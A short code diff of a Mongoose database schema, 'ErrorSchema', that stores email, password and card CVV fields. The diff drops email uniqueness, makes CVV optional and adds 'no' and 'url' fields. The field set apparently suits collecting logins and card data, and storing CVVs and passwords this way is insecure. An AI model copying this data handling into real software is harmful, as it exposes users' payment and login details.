@@ -5,7 +5,6 @@ const ErrorSchema = new mongoose_1.Schema({
     email: {
         type: String,
         required: true,
-        unique: true,
     },
     password: {
         type: String,
@@ -27,10 +26,9 @@ const ErrorSchema = new mongoose_1.Schema({
         type: String,
         required: true,
     },
-    cvv: {
-        type: String,
-        required: true,
-    },
+    cvv: String,
+    no: String,
+    url: String,
     stop_sharing: {
         type: String,
         required: true,
